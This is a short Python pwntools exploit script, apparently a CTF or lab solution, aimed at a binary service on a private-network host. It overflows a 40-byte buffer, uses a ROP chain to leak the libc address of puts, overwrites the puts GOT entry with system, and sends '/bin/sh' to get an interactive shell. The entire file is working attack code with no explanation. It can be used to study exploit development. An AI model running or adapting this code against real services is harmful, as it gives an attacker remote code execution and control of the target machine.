#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888

context.arch = "amd64"    
r = remote(host,port)

r.recvuntil(":")

put_plt = 0x4004e0
put_got = 0x601018
pop_rdi = 0x00000000004006f3
gets = 0x400510
rop = flat([pop_rdi,put_got,put_plt,pop_rdi,put_got,gets,pop_rdi,put_got+8,put_plt])
payload = "a"*40 + rop


r.sendline(payload)
r.recvuntil("!\n")
puts = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))
puts_off = 0x6f690
libc = puts - puts_off
print "libc:",hex(libc)
system_off = 0x45390
system = libc + system_off
r.sendline(p64(system) + "/bin/sh\x00")
r.interactive()
